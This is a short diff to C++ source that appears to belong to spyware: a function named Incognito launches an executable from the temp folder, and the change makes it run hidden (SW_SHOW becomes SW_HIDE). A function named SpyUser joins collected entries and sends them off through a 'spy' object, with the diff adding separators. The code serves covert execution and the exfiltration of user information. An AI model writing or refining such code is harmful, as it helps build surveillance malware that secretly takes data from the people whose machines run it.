@@ -81,7 +81,7 @@ void Incognito(std::filesystem::path path)
 		s2ws(std::filesystem::path(std::filesystem::temp_directory_path().string() + EXE_NAME).string()).c_str(),
 		s2ws(path.string()).c_str(),
 		NULL,
-		SW_SHOW); //  SW_HIDE !!!
+		SW_HIDE);
 }
 
 void SpyUser(std::filesystem::path __dirname)
@@ -150,7 +150,7 @@ void SpyUser(std::filesystem::path __dirname)
 						std::string info = "";
 						for (std::string entry : list)
 						{
-							info += entry;
+							info += entry + " ";
 						}
 						spy.SendInformation(info);
 					}
